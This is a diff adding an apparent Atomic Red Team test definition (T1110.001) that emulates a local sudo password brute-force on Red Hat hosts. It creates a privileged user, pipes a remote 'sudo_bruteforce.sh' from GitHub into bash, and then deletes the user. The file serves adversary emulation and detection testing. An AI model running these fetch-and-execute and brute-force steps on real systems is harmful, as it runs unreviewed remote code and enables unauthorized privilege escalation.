@@ -1,0 +1,105 @@
+{
+  "id": "4097bc00-5eeb-4d56-aaf9-287d60351d95",
+  "name": "SUDO Brute Force - Redhat",
+  "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "886ccaf2-80aa-4c47-850a-45ded185beed",
+      "type": "execute-command",
+      "data": {
+        "command": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n",
+        "command_type": "bash"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0bd61aad-58d9-46e6-9697-6acd07f56d02",
+      "type": "execute-command",
+      "data": {
+        "command": "userdel -fr art\n",
+        "command_type": "bash"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "3f93d4ab-8a8b-4ede-ab80-1f301b507af5",
+      "name": "Check dependency 1/1",
+      "description": "Check if running on a Redhat based machine.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then echo \"RedHat\"; else echo \"NOT RedHat\"; exit 1; fi\nif grep -Rq \"pam_faillock\" /etc/pam.d/*; then echo \"pam_faillock configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "7a902a2c-2c8f-4ee0-b8ed-9ec508ec3682",
+      "name": "Resolve dependency 1/1",
+      "description": "Check if running on a Redhat based machine.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "yum update \u0026\u0026 yum install -y openssl sudo curl\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "335aee7e-8c9e-4540-803a-5656b172fcaa",
+      "name": "Re-check dependency 1/1",
+      "description": "Check if running on a Redhat based machine.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then echo \"RedHat\"; else echo \"NOT RedHat\"; exit 1; fi\nif grep -Rq \"pam_faillock\" /etc/pam.d/*; then echo \"pam_faillock configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "886ccaf2-80aa-4c47-850a-45ded185beed",
+      "p": "on-success",
+      "o": "0bd61aad-58d9-46e6-9697-6acd07f56d02"
+    },
+    {
+      "s": "886ccaf2-80aa-4c47-850a-45ded185beed",
+      "p": "on-failure",
+      "o": "0bd61aad-58d9-46e6-9697-6acd07f56d02"
+    },
+    {
+      "s": "3f93d4ab-8a8b-4ede-ab80-1f301b507af5",
+      "p": "on-success",
+      "o": "886ccaf2-80aa-4c47-850a-45ded185beed"
+    },
+    {
+      "s": "3f93d4ab-8a8b-4ede-ab80-1f301b507af5",
+      "p": "on-failure",
+      "o": "7a902a2c-2c8f-4ee0-b8ed-9ec508ec3682"
+    },
+    {
+      "s": "7a902a2c-2c8f-4ee0-b8ed-9ec508ec3682",
+      "p": "on-success",
+      "o": "335aee7e-8c9e-4540-803a-5656b172fcaa"
+    },
+    {
+      "s": "335aee7e-8c9e-4540-803a-5656b172fcaa",
+      "p": "on-failure",
+      "o": "886ccaf2-80aa-4c47-850a-45ded185beed"
+    }
+  ],
+  "tags": [
+    "T1110.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "remote_url",
+      "type": "url",
+      "description": "url of remote payload",
+      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh"
+    }
+  ]
+}
